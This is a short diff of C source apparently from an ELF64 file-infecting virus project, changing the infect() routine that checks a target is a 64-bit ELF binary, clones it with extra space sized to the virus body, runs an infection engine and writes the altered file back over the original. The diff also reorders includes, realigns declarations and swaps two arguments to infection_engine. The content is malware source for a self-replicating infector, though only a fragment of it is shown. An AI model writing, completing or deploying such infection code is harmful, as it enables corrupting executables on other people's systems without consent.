@@ -1,6 +1,5 @@
-
-#include "syscall.h"
 #include "virus.h"
+#include "syscalls.h"
 #include "utils.h"
 #include "errors.h"
 #include "logs.h"
@@ -29,10 +28,10 @@ static bool	is_elf64(const char *file)
 
 inline bool	infect(const struct virus_header *vhdr, const char *file)
 {
-	struct safe_ptr		file_ref   = {.ptr = NULL, .size = 0};
-	struct safe_ptr		clone_ref  = {.ptr = NULL, .size = 0};
-	struct virus_header	local_vhdr = *vhdr;
-	size_t			extra_size = local_vhdr.full_virus_size * 2;
+	struct safe_ptr		file_ref     = {.ptr = NULL, .size = 0};
+	struct safe_ptr		clone_ref    = {.ptr = NULL, .size = 0};
+	struct virus_header	local_vhdr   = *vhdr;
+	size_t			extra_size   = local_vhdr.full_virus_size * 2;
 	size_t			shift_amount = 0;
 
 	log_try_infecting(file);
@@ -40,7 +39,7 @@ inline bool	infect(const struct virus_header *vhdr, const char *file)
 	if (!is_elf64(file)
 	|| !init_file_safe(&file_ref, file)
 	|| !init_clone_safe(&clone_ref, file_ref.size, extra_size)
-	|| !infection_engine(&local_vhdr, clone_ref, file_ref, &shift_amount)
+	|| !infection_engine(&local_vhdr, file_ref, clone_ref, &shift_amount)
 	|| !write_file(clone_ref, file_ref.size + shift_amount, file))
 	{
 		free_accessor(&file_ref);
